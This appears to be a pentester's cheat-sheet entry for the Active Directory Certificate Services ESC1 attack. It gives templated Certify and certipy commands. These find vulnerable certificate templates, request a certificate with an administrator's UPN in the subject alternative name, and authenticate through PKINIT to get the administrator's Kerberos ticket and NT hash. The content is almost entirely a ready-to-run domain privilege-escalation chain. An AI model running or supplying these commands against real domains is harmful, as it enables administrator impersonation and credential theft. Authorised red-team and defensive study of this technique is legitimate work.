---
technique: ESC1 - Enrollee-Supplied Subject
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc1 certificate-services pkinit
---

# ESC1 - Enrollee-Supplied Subject

ESC1 abuses templates that let requesters supply subject alternative names, allowing certificate requests for another principal.

## Windows

### ESC1: Certify (enumerate)

#powershell #certify #san #enum

Enumerate vulnerable templates with Certify to find templates that allow enrollee-supplied SANs.

```powershell title:"ESC1: enumerate vulnerable templates with Certify"
.\Certify.exe find /vulnerable
```
<!-- cheat
import domain_ip
import users
-->

### ESC1: Certify (request)

#powershell #certify #san

Request a cert with an arbitrary SAN to impersonate a privileged user.

```powershell title:"ESC1: request cert with admin SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
var target_user
-->

## Linux

### ESC1: Step 1: request cert with admin SAN (certipy)

#certipy #san #pkinit

Request a cert with an arbitrary UPN in the SAN from a template that allows enrollee-supplied subject.

```sh title:"ESC1: request cert with admin SAN via certipy"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC1: Step 2: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the cert to get the admin TGT and NT hash.

```sh title:"ESC1: PKINIT with admin cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->
